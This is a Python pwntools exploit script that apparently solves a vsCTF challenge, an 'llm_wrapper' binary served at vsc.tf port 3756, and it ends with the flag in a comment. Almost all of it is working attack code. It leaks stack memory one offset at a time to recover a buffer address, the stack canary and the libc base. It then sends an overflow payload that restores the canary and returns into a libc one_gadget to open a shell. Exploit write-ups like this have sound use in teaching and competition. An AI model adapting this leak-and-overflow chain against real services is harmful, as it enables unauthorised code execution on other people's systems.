#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./llm_wrapper_patched")
libc = ELF('./libc.so.6')

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("vsc.tf", 3756)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b':', b'A' * 8)
	r.sendlineafter(b'choice:', b'2')
	r.sendlineafter(b'ask me?', b'B' * 8)

	def leak_offset(offset):
		r.sendlineafter(b'choice:', b'2')
		r.sendlineafter(b'ask me?', b'C' * 16 + offset.to_bytes(1, 'big'))
		r.sendlineafter(b'choice:', b'1')

		r.recvuntil(b'token \"')
		return r.recvuntil(b'\"')[:-1]


	leak_index = 0

	for i in range(0, 256, 8):
		leak = leak_offset(i)
		if leak == (b'A' * 8):
			leak_index = i
			break
		print(i, leak)

	prompt_addr_str = leak_offset(leak_index - 0x10)
	prompt_addr = u64(prompt_addr_str)
	success(f'{hex(prompt_addr)=}')

	canary_str = leak_offset(leak_index + 0x18)
	canary = u64(canary_str)
	success(f'{hex(canary)=}')

	libc_leak_str = leak_offset(leak_index + 0x88)
	libc_leak = u64(libc_leak_str) - (0x7f9373987d90 - 0x7f937395e000)
	success(f'{hex(libc_leak)=}')
	libc.address = libc_leak

	one_gadget = libc.address + [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8][0]
	r.sendlineafter(b'choice:', b'2')
	payload = flat(
		b'B' * 8,
		prompt_addr - 0x20,
		prompt_addr + 0x10,
		8,
		b'A' * 8,
		0,
		prompt_addr + 0x90,
		canary,
		one_gadget,
		0,
		prompt_addr,
		one_gadget,
	)

	r.sendlineafter(b'ask me?', payload)
	r.sendlineafter(b'choice:', b'3')

	r.interactive()


if __name__ == "__main__":
	main()


# vsctf{4n_llm_d3f1nit3ly_wr0t3_th@t_c0d3}
